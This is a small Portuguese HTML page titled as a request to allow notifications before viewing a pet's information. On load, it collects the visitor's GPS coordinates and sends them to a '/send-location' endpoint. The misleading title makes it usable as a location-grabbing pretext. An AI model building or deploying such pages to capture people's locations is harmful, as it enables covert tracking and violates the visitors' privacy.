<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Para prosseguir com as informações do pet, permita a notificações...</title>
</head>
<body>
  <h2>Coletando localização...</h2>

  <script>
    window.onload = function () {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            
            fetch('/send-location', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ lat, lon })
            })
            .then(() => {
              document.body.innerHTML = "<h2>Localização enviada com sucesso!</h2>";
            })
            .catch(() => {
              document.body.innerHTML = "<h2>Erro ao enviar localização.</h2>";
            });
          },
          (error) => {
            document.body.innerHTML = "<h2>Erro ao obter localização: " + error.message + "</h2>";
          }
        );
      } else {
        document.body.innerHTML = "<h2>Seu navegador não suporta geolocalização.</h2>";
      }
    };
  </script>
</body>
</html>
